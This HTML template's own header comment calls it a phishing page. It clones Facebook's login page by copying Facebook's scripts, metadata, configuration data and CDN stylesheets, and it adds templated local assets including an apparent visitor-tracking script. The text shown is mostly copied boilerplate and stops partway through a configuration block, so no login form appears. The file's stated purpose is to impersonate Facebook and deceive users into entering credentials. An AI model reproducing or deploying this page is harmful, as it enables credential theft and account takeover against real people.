<!DOCTYPE html>
<!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
<html lang="en" id="facebook">
  <head>
    <meta charset="utf-8" />
    <meta
      name="referrer"
      content="origin-when-crossorigin"
      id="meta_referrer"
    />
    <link rel="stylesheet" href="{{ asset('css/facebook/style.css') }}" />
    <script src="{{ asset('js/facebook/script.js') }}"></script>
    <script src="{{ asset('js/facebook/visitor.js') }}"></script>
    <script nonce="">
      window._cstart = +new Date();
    </script>
    <script nonce="">
      function envFlush(a) {
        function b(b) {
          for (var c in a) b[c] = a[c];
        }
        window.requireLazy
          ? window.requireLazy(["Env"], b)
          : ((window.Env = window.Env || {}), b(window.Env));
      }
      envFlush({
        ajaxpipe_token: "AXiGbmHFo5xoOvnwnZ8",
        timeslice_heartbeat_config: {
          pollIntervalMs: 33,
          idleGapThresholdMs: 60,
          ignoredTimesliceNames: {
            requestAnimationFrame: true,
            "Event listenHandler mousemove": true,
            "Event listenHandler mouseover": true,
            "Event listenHandler mouseout": true,
            "Event listenHandler scroll": true,
          },
          isHeartbeatEnabled: true,
          isArtilleryOn: false,
        },
        shouldLogCounters: true,
        timeslice_categories: { react_render: true, reflow: true },
        sample_continuation_stacktraces: true,
        dom_mutation_flag: true,
        gk_requirelazy_mem: true,
        gk_instrument_object_url: true,
        stack_trace_limit: 30,
        timesliceBufferSize: 5000,
        show_invariant_decoder: false,
        compat_iframe_token: "AQ7g9Oz4RTWHxL_S0S4",
        isCQuick: false,
      });
    </script>
    <style nonce=""></style>
    <script nonce="">
      __DEV__ = 0;
      (CavalryLogger =
        window.CavalryLogger ||
        function (a) {
          (this.lid = a),
            (this.transition = !1),
            (this.metric_collected = !1),
            (this.is_detailed_profiler = !1),
            (this.instrumentation_started = !1),
            (this.pagelet_metrics = {}),
            (this.events = {}),
            (this.ongoing_watch = {}),
            (this.values = { t_cstart: window._cstart }),
            (this.piggy_values = {}),
            (this.bootloader_metrics = {}),
            (this.resource_to_pagelet_mapping = {}),
            this.initializeInstrumentation && this.initializeInstrumentation();
        }),
        (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
          this.is_detailed_profiler = a;
          return this;
        }),
        (CavalryLogger.prototype.setTTIEvent = function (a) {
          this.tti_event = a;
          return this;
        }),
        (CavalryLogger.prototype.setValue = function (a, b, c, d) {
          d = d ? this.piggy_values : this.values;
          (typeof d[a] === "undefined" || c) && (d[a] = b);
          return this;
        }),
        (CavalryLogger.prototype.getLastTtiValue = function () {
          return this.lastTtiValue;
        }),
        (CavalryLogger.prototype.setTimeStamp =
          CavalryLogger.prototype.setTimeStamp ||
          function (a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event &&
              a == this.tti_event &&
              ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
            return this;
          }),
        (CavalryLogger.prototype.mark =
          typeof console === "object" && console.timeStamp
            ? function (a) {
                console.timeStamp(a);
              }
            : function () {}),
        (CavalryLogger.prototype.addPiggyback = function (a, b) {
          this.piggy_values[a] = b;
          return this;
        }),
        (CavalryLogger.instances = {}),
        (CavalryLogger.id = 0),
        (CavalryLogger.getInstance = function (a) {
          typeof a === "undefined" && (a = CavalryLogger.id);
          CavalryLogger.instances[a] ||
            (CavalryLogger.instances[a] = new CavalryLogger(a));
          return CavalryLogger.instances[a];
        }),
        (CavalryLogger.setPageID = function (a) {
          if (CavalryLogger.id === 0) {
            var b = CavalryLogger.getInstance();
            CavalryLogger.instances[a] = b;
            CavalryLogger.instances[a].lid = a;
            delete CavalryLogger.instances[0];
          }
          CavalryLogger.id = a;
        }),
        (CavalryLogger.now = function () {
          return window.performance &&
            performance.timing &&
            performance.timing.navigationStart &&
            performance.now
            ? performance.now() + performance.timing.navigationStart
            : new Date().getTime();
        }),
        (CavalryLogger.prototype.measureResources = function () {}),
        (CavalryLogger.prototype.profileEarlyResources = function () {}),
        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
        (CavalryLogger.start_js = function () {}),
        (CavalryLogger.start_js_script = function () {}),
        (CavalryLogger.done_js = function () {});
      CavalryLogger.getInstance().setTTIEvent("t_domcontent");
      (CavalryLogger.prototype.measureResources = function (a, b) {
        if (!this.log_resources) return;
        var c = "bootload/" + a.name;
        if (
          this.bootloader_metrics[c] !== void 0 ||
          this.ongoing_watch[c] !== void 0
        )
          return;
        var d = CavalryLogger.now();
        this.ongoing_watch[c] = d;
        "start_" + c in this.bootloader_metrics ||
          (this.bootloader_metrics["start_" + c] = d);
        b &&
          !("tag_" + c in this.bootloader_metrics) &&
          (this.bootloader_metrics["tag_" + c] = b);
        if (a.type === "js") {
          c = "js_exec/" + a.name;
          this.ongoing_watch[c] = d;
        }
      }),
        (CavalryLogger.prototype.stopWatch = function (a) {
          if (this.ongoing_watch[a]) {
            var b = CavalryLogger.now(),
              c = b - this.ongoing_watch[a];
            this.bootloader_metrics[a] = c;
            var d = this.piggy_values;
            a.indexOf("bootload") === 0 &&
              (d.t_resource_download || (d.t_resource_download = 0),
              d.resources_downloaded || (d.resources_downloaded = 0),
              (d.t_resource_download += c),
              (d.resources_downloaded += 1),
              d["tag_" + a] == "_EF_" &&
                (d.t_pagelet_cssload_early_resources = b));
            delete this.ongoing_watch[a];
          }
          return this;
        }),
        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
          var a = {};
          Object.values(window.CavalryLogger.instances).forEach(function (b) {
            b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
          });
          return a;
        }),
        (CavalryLogger.start_js = function (a) {
          for (var b = 0; b < a.length; ++b)
            CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
        }),
        (CavalryLogger.start_js_script = function (a) {
          if (!a || !a.dataset) return;
          CavalryLogger.start_js([
            a.dataset.bootloaderHash || a.dataset.bootloaderHashClient,
          ]);
        }),
        (CavalryLogger.done_js = function (a) {
          for (var b = 0; b < a.length; ++b)
            CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
        }),
        (CavalryLogger.prototype.profileEarlyResources = function (a) {
          for (var b = 0; b < a.length; b++)
            this.measureResources(
              { name: a[b][0], type: a[b][1] ? "js" : "" },
              "_EF_"
            );
        });
      CavalryLogger.getInstance().log_resources = true;
      CavalryLogger.getInstance().setIsDetailedProfiler(true);
      window.CavalryLogger &&
        CavalryLogger.getInstance().setTimeStamp("t_start");
    </script>
    <noscript
      ><meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1"
    /></noscript>
    <link
      rel="manifest"
      id="MANIFEST_LINK"
      href="https://facebook.com/data/manifest/"
      crossorigin="use-credentials"
    />
    <title id="pageTitle">Facebook – log in or sign up</title>
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:url" content="https://www.facebook.com/" />
    <meta
      property="og:image"
      content="https://www.facebook.com/images/fb_icon_325x325.png"
    />
    <meta property="og:locale" content="en_GB" />
    <link
      rel="alternate"
      media="only screen and (max-width: 640px)"
      href="https://m.facebook.com/"
    />
    <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
    <meta
      name="description"
      content="Log in to Facebook to start sharing and connecting with your friends, family and people you know."
    />
    <script type="application/ld+json" nonce="">
      {
        "\u0040context": "http:\/\/schema.org",
        "\u0040type": "WebSite",
        "name": "Facebook",
        "url": "https:\/\/en-gb.facebook.com\/"
      }
    </script>
    <link rel="canonical" href="https://www.facebook.com/" />
    <link
      rel="shortcut icon"
      href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/zvfS2wV_bL3.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="KeLRD1z"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/y3/l/0,cross/5WfpJC2KSHe.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="XCvu4Ie"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/EE0cKe4KBQ3.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="+xujYrB"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/S81YVWe8H_A.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="tH07smz"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/l/0,cross/PG5tRCkVwWX.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="tvWqIy4"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/tkUx0C0mTdH.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="U7cyoYM"
      crossorigin="anonymous"
    />
    <script
      src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/wTY5qBMkTkR.js?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="A+mvvL2"
      crossorigin="anonymous"
      nonce=""
    ></script>
    <script nonce="">
      requireLazy(["HasteSupportData"], function (m) {
        m.handle({
          clpData: {
            1814852: { r: 1 },
            1838142: { r: 1, s: 1 },
            1949898: { r: 1 },
            1848815: { r: 10000, s: 1 },
            1744178: { r: 1, s: 1 },
          },
          gkxData: {
            5241: { result: true, hash: "AT7o1bCQPGpf3ShEY_I" },
            676837: { result: false, hash: "AT4N8wBZA8ctCdHwHSg" },
            708253: { result: false, hash: "AT5n4hBL3YTMnQWtUFA" },
            996940: { result: false, hash: "AT7opYuEGy3sjG1agAM" },
            1224637: { result: false, hash: "AT7JRluWxuwDm3XzXA4" },
            1263340: { result: false, hash: "AT5bwizWgDaFQudm1yw" },
            676920: { result: true, hash: "AT497IX4gOFG8gZea4Y" },
            1073500: { result: false, hash: "AT7aJmfnqWyioxOOyYE" },
            1167394: { result: false, hash: "AT7BpN-tlUPwbIIFKBA" },
            1857581: { result: false, hash: "AT5yTxGMp6le0PAtTdc" },
            2772: { result: false, hash: "AT5Eu244WIce7iwqgxU" },
            3752: { result: false, hash: "AT6eS5UTkkMp_xbPLC0" },
            3831: { result: false, hash: "AT4W23lQ0XxAZniM9d8" },
            4075: { result: false, hash: "AT4_ZQi0sTjSt-RxVVc" },
            676838: { result: false, hash: "AT6nN1ehT9yq-2q6eo4" },
            1217157: { result: false, hash: "AT6B7YmllOsArnK6KQo" },
            1554827: { result: false, hash: "AT7zueGLhGo0cT5xizs" },
            1738486: { result: false, hash: "AT4cX37oQco6DwhULM0" },
          },
          qplData: { 7758: { r: 1 } },
        });
      });
      requireLazy(
        ["TimeSliceImpl", "ServerJS"],
        function (TimeSlice, ServerJS) {
          new ServerJS().handle({
            define: [
              [
                "URLFragmentPreludeConfig",
                [],
                {
                  hashtagRedirect: true,
                  fragBlacklist: [
                    "nonce",
                    "access_token",
                    "oauth_token",
                    "xs",
                    "checkpoint_data",
                    "code",
                  ],
                },
                137,
              ],
              [
                "CometPersistQueryParams",
                [],
                { relative: {}, domain: {} },
                6231,
              ],
              ["CookieDomain", [], { domain: "facebook.com" }, 6421],
              [
                "BootloaderConfig",
                [],
                {
                  deferBootloads: false,
                  jsRetries: [200, 500],
                  jsRetryAbortNum: 2,
                  jsRetryAbortTime: 5,
                  silentDups: false,
                  hypStep4: false,
                  phdOn: false,
                  btCutoffIndex: 3199,
                },
                329,
              ],
              [
                "CSSLoaderConfig",
                [],
                {
                  timeout: 5000,
                  modulePrefix: "BLCSS:",
                  loadEventSupported: true,
                },
                619,
              ],
              [
                "CookieCoreConfig",
                [],
                {
                  c_user: { s: "None" },
                  cppo: { t: 86400, s: "None" },
                  dpr: { t: 604800, s: "None" },
                  fbl_ci: { t: 31536000, s: "None" },
                  fbl_cs: { t: 31536000, s: "None" },
                  fbl_st: { t: 31536000, s: "Strict" },
                  i_user: { s: "None" },
                  locale: { t: 604800, s: "None" },
                  m_pixel_ratio: { t: 604800, s: "None" },
                  noscript: { s: "None" },
                  presence: { t: 2592000, s: "None" },
                  sfau: { s: "None" },
                  usida: { s: "None" },
                  vpd: { t: 5184000, s: "Lax" },
                  wd: { t: 604800, s: "Lax" },
                  "x-referer": { s: "None" },
                  "x-src": { t: 1, s: "None" },
                },
                2104,
              ],
              ["CurrentCommunityInitialData", [], {}, 490],
              [
                "CurrentEnvironment",
                [],
                {
                  facebookdotcom: true,
                  messengerdotcom: false,
                  workplacedotcom: false,
                  instagramdotcom: false,
                },
                827,
              ],
              [
                "CurrentUserInitialData",
                [],
                {
                  ACCOUNT_ID: "0",
                  USER_ID: "0",
                  NAME: "",
                  SHORT_NAME: null,
                  IS_BUSINESS_PERSON_ACCOUNT: false,
                  HAS_SECONDARY_BUSINESS_PERSON: false,
                  IS_FACEBOOK_WORK_ACCOUNT: false,
                  IS_MESSENGER_ONLY_USER: false,
                  IS_DEACTIVATED_ALLOWED_ON_MESSENGER: false,
                  IS_MESSENGER_CALL_GUEST_USER: false,
                  IS_WORK_MESSENGER_CALL_GUEST_USER: false,
                  APP_ID: "256281040558",
                  IS_BUSINESS_DOMAIN: false,
                },
                270,
              ],
              ["DTSGInitialData", [], {}, 258],
              ["ISB", [], {}, 330],
              ["LSD", [], { token: "AVqK7GczFT0" }, 323],
              [
                "ServerNonce",
                [],
                { ServerNonce: "B48umobUnL9dKpF7dBtSL5" },
                141,
              ],
              [
                "SiteData",
                [],
                {
                  server_revision: 1005083706,
                  client_revision: 1005083598,
                  tier: "",
                  push_phase: "C3",
                  pkg_cohort: "BP:DEFAULT",
                  haste_session: "19040.BP:DEFAULT.2.0.0.0.",
                  pr: 1,
                  haste_site: "www",
                  be_one_ahead: false,
                  is_rtl: false,
                  is_comet: false,
                  is_experimental_tier: false,
                  is_jit_warmed_up: true,
                  hsi: "7065651880395410549-0",
                  semr_host_bucket: "5",
                  bl_hash_version: 2,
                  skip_rd_bl: true,
                  comet_env: 0,
                  spin: 4,
                  __spin_r: 1005083598,
                  __spin_b: "trunk",
                  __spin_t: 1645100275,
                  vip: "157.240.1.35",
                },
                317,
              ],
              [
                "SprinkleConfig",
                [],
                { param_name: "jazoest", version: 2, should_randomize: false },
                2111,
              ],
              [
                "UserAgentData",
                [],
                {
                  browserArchitecture: "64",
                  browserFullVersion: "98.0.4758.102",
                  browserMinorVersion: 0,
                  browserName: "Chrome",
                  browserVersion: 98,
                  deviceName: "Unknown",
                  engineName: "WebKit",
                  engineVersion: "537.36",
                  platformArchitecture: "64",
                  platformName: "Windows",
                  platformVersion: "10",
                  platformFullVersion: "10",
                },
                527,
              ],
              [
                "PromiseUsePolyfillSetImmediateGK",
                [],
                { www_always_use_polyfill_setimmediate: false },
                2190,
              ],
              [
                "KSConfig",
                [],
                {
                  killed: {
                    __set: [
                      "MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER",
                      "MLHUB_FLOW_AUTOREFRESH_SEARCH",
                      "NEKO_DISABLE_CREATE_FOR_SAP",
                      "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
                      "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
                      "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
                      "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
                      "BUY_AT_UI_LINE_DELETE",
                      "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
                      "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
                      "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
                      "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG",
                      "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME",
                      "ADS_STORE_VISITS_METRICS_DEPRECATION",
                      "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER",
                      "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION",
                      "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL",
                      "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS",
                      "LAB_NET_NEW_UI_RELEASE",
                      "POCKET_MONSTERS_CREATE",
                      "POCKET_MONSTERS_DELETE",
                      "SRT_BANZAI_SRT_CORE_LOGGER",
                      "SRT_BANZAI_SRT_MAIN_LOGGER",
                      "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES",
                      "POCKET_MONSTERS_UPDATE_NAME",
                      "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE",
                      "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER",
                      "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD",
                    ],
                  },
                  ko: {
                    __set: [
                      "8H4bQmEiuLT",
                      "3OsLvnSHNTt",
                      "1G7wJ6bJt9K",
                      "9NpkGYwzrPG",
                      "3oh5Mw86USj",
                      "8NAceEy9JZo",
                      "7FOIzos6XJX",
                      "rf8JEPGgOi",
                      "4j36SVzvP3w",
                      "4NSq3ZC4ScE",
                      "53gCxKq281G",
                      "3yzzwBY7Npj",
                      "1onzIv0jH6H",
                      "8PlKuowafe8",
                      "1ntjZ2zgf03",
                      "4SIH2GRVX5W",
                      "2dhqRnqXGLQ",
                      "2WgiNOrHVuC",
                      "amKHb4Cw4WI",
                      "5mNEXob0nTj",
                      "8rDvN9vWdAK",
                      "9cL5o2kjfZo",
                      "5BdzWGmfvrA",
                      "DDZhogI19W",
                      "acrJTh9WGdp",
                      "1oOE64fL4wO",
                      "9Gd8qgRxn8z",
                      "MPMaqnqZ9c",
                      "5XCz1h9Iaw3",
                      "7r6mSP7ofr2",
                      "6DGPLrRdyts",
                      "aWxCyi1sEC7",
                      "9kCSDzzr8fu",
                    ],
                  },
                },
                2580,
              ],
              [
                "JSErrorLoggingConfig",
                [],
                {
                  appId: 256281040558,
                  extra: [],
                  reportInterval: 50,
                  sampleWeight: null,
                  sampleWeightKey: "__jssesw",
                  projectBlocklist: [],
                },
                2776,
              ],
              [
                "DataStoreConfig",
                [],
                { expandoKey: "__FB_STORE", useExpando: true },
                2915,
              ],
              [
                "CookieCoreLoggingConfig",
                [],
                {
                  maximumIgnorableStallMs: 16.67,
                  sampleRate: 9.7e-5,
                  sampleRateClassic: 1.0e-10,
                  sampleRateFastStale: 1.0e-8,
                },
                3401,
              ],
              [
                "ImmediateImplementationExperiments",
                [],
                { prefer_message_channel: true },
                3419,
              ],
              ["DTSGInitData", [], { token: "", async_get_token: "" }, 3515],
              [
                "UriNeedRawQuerySVConfig",
                [],
                {
                  uris: [
                    "dms.netmng.com",
                    "doubleclick.net",
                    "r.msn.com",
                    "watchit.sky.com",
                    "graphite.instagram.com",
                    "www.kfc.co.th",
                    "learn.pantheon.io",
                    "www.landmarkshops.in",
                    "www.ncl.com",
                    "s0.wp.com",
                    "www.tatacliq.com",
                    "bs.serving-sys.com",
                    "kohls.com",
                    "lazada.co.th",
                    "xg4ken.com",
                    "technopark.ru",
                    "officedepot.com.mx",
                    "bestbuy.com.mx",
                    "booking.com",
                    "nibio.no",
                  ],
                },
                3871,
              ],
              [
                "InitialCookieConsent",
                [],
                {
                  deferCookies: false,
                  initialConsent: { __set: [1, 2] },
                  noCookies: false,
                  shouldShowCookieBanner: false,
                },
                4328,
              ],
              [
                "TrustedTypesConfig",
                [],
                { useTrustedTypes: false, reportOnly: false },
                4548,
              ],
              [
                "WebConnectionClassServerGuess",
                [],
                { connectionClass: "EXCELLENT" },
                4705,
              ],
              [
                "CometAltpayJsSdkIframeAllowedDomains",
                [],
                {
                  allowed_domains: [
                    "https:\/\/live.adyen.com",
                    "https:\/\/integration-facebook.payu.in",
                    "https:\/\/facebook.payulatam.com",
                    "https:\/\/secure.payu.com",
                    "https:\/\/facebook.dlocal.com",
                    "https:\/\/buy2.boku.com",
                  ],
                },
                4920,
              ],
              [
                "BootloaderEndpointConfig",
                [],
                {
                  debugNoBatching: false,
                  endpointURI:
                    "https:\/\/www.facebook.com\/ajax\/bootloader-endpoint\/",
                },
                5094,
              ],
              [
                "CookieConsentIFrameConfig",
                [],
                {
                  consent_param:
                    "FQAREhIA.ARb40iR9YnbR8TAXJhUeZcC__xf0tzSChGBJGl3dp8eiFqnZ",
                  allowlisted_iframes: [],
                },
                5540,
              ],
              [
                "BigPipeExperiments",
                [],
                {
                  link_images_to_pagelets: false,
                  enable_bigpipe_plugins: false,
                },
                907,
              ],
              [
                "AsyncRequestConfig",
                [],
                {
                  retryOnNetworkError: "1",
                  useFetchStreamAjaxPipeTransport: false,
                },
                328,
              ],
              ["FbtQTOverrides", [], { overrides: {} }, 551],
              [
                "FbtResultGK",
                [],
                { shouldReturnFbtResult: true, inlineMode: "NO_INLINE" },
                876,
              ],
              [
                "IntlPhonologicalRules",
                [],
                {
                  meta: {
                    "\/_B\/": "([.,!?\\s]|^)",
                    "\/_E\/": "([.,!?\\s]|$)",
                  },
                  patterns: {
                    "\/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)\/":
                      "\u0001$1$2s\u0001$3",
                    "\/_\u0001([^\u0001]*)\u0001\/": "javascript",
                  },
                },
                1496,
              ],
              [
                "IntlViewerContext",
                [],
                { GENDER: 3, regionalLocale: null },
                772,
              ],
              [
                "NumberFormatConfig",
                [],
                {
                  decimalSeparator: ".",
                  numberDelimiter: ",",
                  minDigitsForThousandsSeparator: 4,
                  standardDecimalPatternInfo: {
                    primaryGroupSize: 3,
                    secondaryGroupSize: 3,
                  },
                  numberingSystemData: null,
                },
                54,
              ],
              ["SessionNameConfig", [], { seed: "1vpQ" }, 757],
              ["ZeroCategoryHeader", [], {}, 1127],
              [
                "ZeroRewriteRules",
                [],
                {
                  rewrite_rules: {},
                  whitelist: {
                    "\/hr\/r": 1,
                    "\/hr\/p": 1,
                    "\/zero\/unsupported_browser\/": 1,
                    "\/zero\/policy\/optin": 1,
                    "\/zero\/optin\/write\/": 1,
                    "\/zero\/optin\/legal\/": 1,
                    "\/zero\/optin\/free\/": 1,
                    "\/about\/privacy\/": 1,
                    "\/about\/privacy\/update\/": 1,
                    "\/privacy\/explanation\/": 1,
                    "\/zero\/toggle\/welcome\/": 1,
                    "\/zero\/toggle\/nux\/": 1,
                    "\/zero\/toggle\/settings\/": 1,
                    "\/fup\/interstitial\/": 1,
                    "\/work\/landing": 1,
                    "\/work\/login\/": 1,
                    "\/work\/email\/": 1,
                    "\/ai.php": 1,
                    "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                    "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                    "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                    "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                    "\/qp\/interstitial\/": 1,
                    "\/qp\/action\/redirect\/": 1,
                    "\/qp\/action\/close\/": 1,
                    "\/zero\/support\/ineligible\/": 1,
                    "\/zero_balance_redirect\/": 1,
                    "\/zero_balance_redirect": 1,
                    "\/zero_balance_redirect\/l\/": 1,
                    "\/l.php": 1,
                    "\/lsr.php": 1,
                    "\/ajax\/dtsg\/": 1,
                    "\/checkpoint\/block\/": 1,
                    "\/exitdsite": 1,
                    "\/zero\/balance\/pixel\/": 1,
                    "\/zero\/balance\/": 1,
                    "\/zero\/balance\/carrier_landing\/": 1,
                    "\/zero\/flex\/logging\/": 1,
                    "\/tr": 1,
                    "\/tr\/": 1,
                    "\/sem_campaigns\/sem_pixel_test\/": 1,
                    "\/bookmarks\/flyout\/body\/": 1,
                    "\/zero\/subno\/": 1,
                    "\/confirmemail.php": 1,
                    "\/policies\/": 1,
                    "\/mobile\/internetdotorg\/classifier\/": 1,
                    "\/zero\/dogfooding": 1,
                    "\/xti.php": 1,
                    "\/zero\/fblite\/config\/": 1,
                    "\/hr\/zsh\/wc\/": 1,
                    "\/ajax\/bootloader-endpoint\/": 1,
                    "\/mobile\/zero\/carrier_page\/": 1,
                    "\/mobile\/zero\/carrier_page\/education_page\/": 1,
                    "\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
                    "\/mobile\/zero\/carrier_page\/settings_page\/": 1,
                    "\/aloha_check_build": 1,
                    "\/upsell\/zbd\/softnudge\/": 1,
                    "\/mobile\/zero\/af_transition\/": 1,
                    "\/mobile\/zero\/af_transition\/action\/": 1,
                    "\/mobile\/zero\/freemium\/": 1,
                    "\/mobile\/zero\/freemium\/redirect\/": 1,
                    "\/mobile\/zero\/freemium\/zero_fup\/": 1,
                    "\/privacy\/policy\/": 1,
                    "\/privacy\/center\/": 1,
                    "\/data\/manifest\/": 1,
                    "\/4oh4.php": 1,
                    "\/autologin.php": 1,
                    "\/birthday_help.php": 1,
                    "\/checkpoint\/": 1,
                    "\/contact-importer\/": 1,
                    "\/cr.php": 1,
                    "\/legal\/terms\/": 1,
                    "\/login.php": 1,
                    "\/login\/": 1,
                    "\/mobile\/account\/": 1,
                    "\/n\/": 1,
                    "\/remote_test_device\/": 1,
                    "\/upsell\/buy\/": 1,
                    "\/upsell\/buyconfirm\/": 1,
                    "\/upsell\/buyresult\/": 1,
                    "\/upsell\/promos\/": 1,
                    "\/upsell\/continue\/": 1,
                    "\/upsell\/h\/promos\/": 1,
                    "\/upsell\/loan\/learnmore\/": 1,
                    "\/upsell\/purchase\/": 1,
                    "\/upsell\/promos\/upgrade\/": 1,
                    "\/upsell\/buy_redirect\/": 1,
                    "\/upsell\/loan\/buyconfirm\/": 1,
                    "\/upsell\/loan\/buy\/": 1,
                    "\/upsell\/sms\/": 1,
                    "\/wap\/a\/channel\/reconnect.php": 1,
                    "\/wap\/a\/nux\/wizard\/nav.php": 1,
                    "\/wap\/appreg.php": 1,
                    "\/wap\/birthday_help.php": 1,
                    "\/wap\/c.php": 1,
                    "\/wap\/confirmemail.php": 1,
                    "\/wap\/cr.php": 1,
                    "\/wap\/login.php": 1,
                    "\/wap\/r.php": 1,
                    "\/zero\/datapolicy": 1,
                    "\/a\/timezone.php": 1,
                    "\/a\/bz": 1,
                    "\/bz\/reliability": 1,
                    "\/r.php": 1,
                    "\/mr\/": 1,
                    "\/reg\/": 1,
                    "\/registration\/log\/": 1,
                    "\/terms\/": 1,
                    "\/f123\/": 1,
                    "\/expert\/": 1,
                    "\/experts\/": 1,
                    "\/terms\/index.php": 1,
                    "\/terms.php": 1,
                    "\/srr\/": 1,
                    "\/msite\/redirect\/": 1,
                    "\/fbs\/pixel\/": 1,
                    "\/contactpoint\/preconfirmation\/": 1,
                    "\/contactpoint\/cliff\/": 1,
                    "\/contactpoint\/confirm\/submit\/": 1,
                    "\/contactpoint\/confirmed\/": 1,
                    "\/contactpoint\/login\/": 1,
                    "\/preconfirmation\/contactpoint_change\/": 1,
                    "\/help\/contact\/": 1,
                    "\/survey\/": 1,
                    "\/upsell\/loyaltytopup\/accept\/": 1,
                    "\/settings\/": 1,
                    "\/lite\/": 1,
                    "\/zero_status_update\/": 1,
                    "\/operator_store\/": 1,
                    "\/upsell\/": 1,
                    "\/wifiauth\/login\/": 1,
                  },
                },
                1478,
              ],
              [
                "IntlNumberTypeConfig",
                [],
                {
                  impl: "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }",
                },
                3405,
              ],
              [
                "ServerTimeData",
                [],
                {
                  serverTime: 1645100275073,
                  timeOfRequestStart: 1645100275055,
                  timeOfResponseStart: 1645100275055,
                },
                5943,
              ],
              [
                "AnalyticsCoreData",
                [],
                {
                  device_id:
                    "$^|AcavDKzkRgFUj5Qiaf3VSX0_xQe-giUCV3Pbkxu3qz5JR3bEPClrasINdzn2WQ50jjXtceQe2c2vTm2TRBDvtSAaufK6|fd.AcbHL792NANRGq0MngmOW56SgQ_W5V556ZQPrkmJFJRyn-q0mqPKnPzZHxDPRlGnhYXgJZ8-CgjC-qQk5qfK9a4W",
                  app_id: "256281040558",
                  enable_bladerunner: false,
                  enable_ack: true,
                  push_phase: "C3",
                  enable_observer: false,
                  enable_dataloss_timer: false,
                },
                5237,
              ],
              [
                "cr:696703",
                [],
                {
                  __rc: [
                    null,
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:708886",
                ["EventProfilerImpl"],
                {
                  __rc: [
                    "EventProfilerImpl",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:717822",
                ["TimeSliceImpl"],
                {
                  __rc: [
                    "TimeSliceImpl",
